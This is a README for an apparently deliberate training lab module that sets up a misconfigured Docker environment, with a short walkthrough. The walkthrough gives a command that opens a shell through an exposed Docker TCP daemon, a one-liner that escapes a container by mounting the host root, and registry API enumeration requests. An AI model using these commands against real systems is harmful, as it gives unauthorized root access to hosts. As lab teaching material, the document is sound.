# Docker-Security-Flaws 


## Installation
This module shows two of many possible misconfiguration in Docker environments that could lead to security-related vulnerabilities.
To use it, the `ssh.sh` script, as well as the `docker-security-flaws.sh` script must be included in `modules.txt`. After running the makeVM.sh script, the vulnerable docker setup is ready to use.

## Writeup


- When enumerating ports, you will find port `5500` running a docker registry
- its possible to interact with such registrys via an api


### RCE 

`docker -H tcpL//localhost:4444 exec -it registry /bin/sh`

- provides us a shell inside the container 


### Escaping docker container via exposed socket

- exposed socket in `/var/run`
- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`









## Further information

### Registriy discovery

When discovering a registry, it is always useful to enumerate it further. For example, it is possible to find out all repositories registered on this registry. This is possible as follows:

`GET http://<IP>:<PORT>/v2/_catalog`

Each repository has at least one 'tag' (latest), which can be used for further enumeration. Tags are often software versions or architecture notes.

Its possible to query all published tags via:

`GET http://<IP>:<PORT>/v2/repository/<name>/tags/list`

Its furthermore possible to enumerate a specific repository and the manifest like so:

`GET http://<IP>:<PORT>/v2/cmnatic/<name>/manifests/<tag>`

So it is partly possible to pick off deep hanging fruits and to discover for example information disclosures or default credentials.

### Socket

In most cases, people associate the word socket with network connections. In this case, however, it is a Unix socket. Simply put, UNIX sockets accomplish the same goal as network sockets - transferring data. However, in the host itself with the help of the file system, unlike network interfaces

Due to the fact that UNIX sockets use the filesystem directly, you can use filesystem permissions to decide who or what can read/write. 

Users interact with Docker by using the Docker Engine. For example, commands such as `docker pull` or `docker run` will be executed by the use of a socket - this can either be a UNIX or a TCP socket, but by default, it is a UNIX socket. This is why you must be a part of the "docker" group to use the docker command (remembering that UNIX sockets can use file permissions here!).

Developers love to automate, and this is proven nonetheless with Docker. Whilst Docker uses a UNIX socket, meaning that it can only interact from the host itself. However, someone may wish to remotely execute Docker commands such as in Docker management tools like Portainer or DevOps applications like Jenkins to test their program.


To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.

It would be advisable to use some form of authentication (e.g., a proxy) to prevent misuse, as shown in this vulnerable machine.
